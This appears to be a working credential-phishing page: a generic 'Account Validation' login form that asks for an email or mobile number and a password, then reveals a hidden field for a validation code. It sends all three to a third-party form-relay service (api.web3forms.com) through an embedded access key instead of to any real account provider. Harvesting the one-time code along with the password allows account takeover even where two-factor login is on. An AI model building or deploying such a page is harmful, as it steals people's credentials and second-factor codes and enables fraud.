<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}
form {border: 3px solid #f1f1f1; padding: 16px;}

input[type=text], input[type=password], input[type=number] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  background-color: #04AA6D;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
}

span.psw {
  float: right;
  padding-top: 16px;
}

#codeField {
  display: none; /* hidden until username+password are entered */
}
</style>
</head>
<body>

<h2>Account Validation</h2>

<div class="imgcontainer">
  <img src="img_avatar2.png" alt="Avatar" class="avatar">
</div>

<form id="validationForm" action="https://api.web3forms.com/submit" method="POST">
  <input type="hidden" name="access_key" value="bd395d4f-052f-46be-bebe-62e62bf140d1">

  <div class="container">
    <label for="email"><b>Username</b></label>
    <input type="text" placeholder="Email/Mobile number" name="email" id="email" required>
    
    <label for="password"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="password" id="password" required>
    
    <!-- Code field appears only after username+password are filled -->
    <div id="codeField">
      <label for="code"><b>Validation Code</b></label>
      <input type="text" placeholder="Enter Code" name="code" required>
    </div>
        
    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>
</form>

<script>
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const codeField = document.getElementById("codeField");

  function checkInputs() {
    if (emailInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
      codeField.style.display = "block"; // show code field
    }
  }

  emailInput.addEventListener("input", checkInputs);
  passwordInput.addEventListener("input", checkInputs);
</script>

</body>
</html>
